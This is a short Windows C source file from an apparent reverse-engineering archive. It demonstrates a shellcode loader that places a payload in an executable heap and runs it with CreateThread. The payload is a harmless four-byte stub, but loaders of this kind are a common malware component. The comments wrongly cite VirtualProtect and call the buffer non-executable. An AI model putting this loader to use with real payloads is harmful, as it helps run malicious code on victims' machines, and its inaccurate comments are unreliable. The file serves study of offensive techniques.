/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in stack

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: HeapAlloc
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

#define PAGE_SIZE 4096

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HANDLE      heap;

    // create independent heap with enough size to hold all the shellcode
    heap = HeapCreate (HEAP_CREATE_ENABLE_EXECUTE, 10 * PAGE_SIZE, 100 * PAGE_SIZE);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = HeapAlloc (heap, HEAP_ZERO_MEMORY, payload_len);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // execute the code
    h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
    WaitForSingleObject (h_thread, -1);

    // free the heap and destroy
    HeapFree (heap, 0, runtime);
    HeapDestroy (heap);

    return 0;
}